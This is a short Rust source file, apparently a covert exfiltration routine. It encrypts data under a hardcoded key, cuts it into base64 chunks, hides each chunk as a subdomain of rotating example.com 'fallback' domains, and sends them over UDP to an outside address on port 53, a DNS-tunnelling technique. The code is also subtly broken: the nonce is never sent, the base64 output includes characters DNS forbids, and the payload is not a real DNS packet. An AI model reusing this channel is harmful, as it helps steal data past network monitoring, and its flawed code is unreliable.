use std::net::UdpSocket;
use aes_gcm::{Aes256Gcm, KeyInit};
use aes_gcm::aead::{Aead, Nonce};
use base64;
use rand::Rng;

pub fn transmit_data(data: &str) -> Result<(), String> {
    let key = b"anexamplekeythatisverysecure1234"; 
    let cipher = Aes256Gcm::new_from_slice(key).expect("Invalid key length");
    let nonce = rand::thread_rng().gen::<[u8; 12]>();
    let encrypted_data = cipher
        .encrypt(&nonce.into(), data.as_bytes())
        .map_err(|_| "Encryption failed".to_string())?;

    let domains = vec![
        "fallback1.example.com",
        "fallback2.example.com",
        "fallback3.example.com",
    ];

    for chunk in encrypted_data.chunks(20) {
        let dns_query = format!("{}.{}", base64::encode(chunk), domains[rand::thread_rng().gen_range(0..domains.len())]);
        send_dns_query(&dns_query)?;
    }

    Ok(())
}

fn send_dns_query(query: &str) -> Result<(), String> {
    let socket = UdpSocket::bind("0.0.0.0:0").map_err(|_| "Failed to bind socket")?;
    socket
        .send_to(query.as_bytes(), "8.4.4.8:53")
        .map_err(|_| "Failed to send DNS query")?;
    Ok(())
}
